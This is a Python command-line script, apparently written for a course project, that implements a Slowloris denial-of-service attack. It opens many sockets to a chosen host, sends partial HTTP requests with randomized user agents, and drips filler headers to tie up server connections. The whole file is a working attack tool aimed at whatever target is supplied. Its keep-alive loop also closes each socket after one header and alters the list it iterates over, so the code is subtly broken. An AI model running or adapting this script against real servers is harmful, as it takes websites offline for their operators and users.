#!/usr/bin/env python3

import argparse
import logging
import random
import socket
import sys
from time import sleep

# Argument parser setup
parser = argparse.ArgumentParser(description="DDoS PBL RKS 202 - Slowloris")
parser.add_argument("host", nargs="?", help="Target host to test")
parser.add_argument("-p", "--port", default=80, type=int, help="Port used by the web server, default is 80")
parser.add_argument("-s", "--sockets", default=150, type=int, help="Number of sockets to use")
parser.add_argument("-ua", "--randuseragents", dest="randuseragent", action="store_true", help="Randomize user-agent per request")
parser.add_argument("--https", dest="https", action="store_true", help="Use HTTPS for requests")
parser.add_argument("--sleeptime", dest="sleeptime", default=15, type=int, help="Time between each header sent")
parser.set_defaults(randuseragent=True, https=False)
args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    parser.error("Host required!")

# Logging setup
logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S",
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout)]
)

# Function to send a line to the socket
def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))

# Function to send a header to the socket
def send_header(self, name, value):
    self.send_line(f"{name}: {value}")

# Attach the functions to the socket class
setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)

if args.https:
    logging.info("Importing ssl module")
    import ssl
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)

list_of_sockets = []
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

def create_socket():
    try:
        if args.https:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((args.host, args.port))
            s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((args.host, args.port))
        return s
    except Exception as e:
        logging.info(f"Failed to create socket: {e}")
        return None

# Create the sockets
logging.info("Creating sockets...")
for _ in range(args.sockets):
    s = create_socket()
    if s:
        list_of_sockets.append(s)

logging.info("Setting up the sockets...")
for s in list_of_sockets:
    s.send_line("GET /?{} HTTP/1.1".format(random.randint(0, 2000)))
    #s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
    s.send_header("User-Agent", random.choice(user_agents))
    s.send_header("Accept-language", "en-US,en,q=0.5")

# Main loop to keep the sockets alive
while list_of_sockets:
    for s in list_of_sockets:
        try:
            s.send_header("X-a", random.randint(1, 5000))
            s.close()
        except Exception as e:
            logging.info(f"Failed to send keep-alive header: {e}")
            list_of_sockets.remove(s)
    sleep(args.sleeptime)
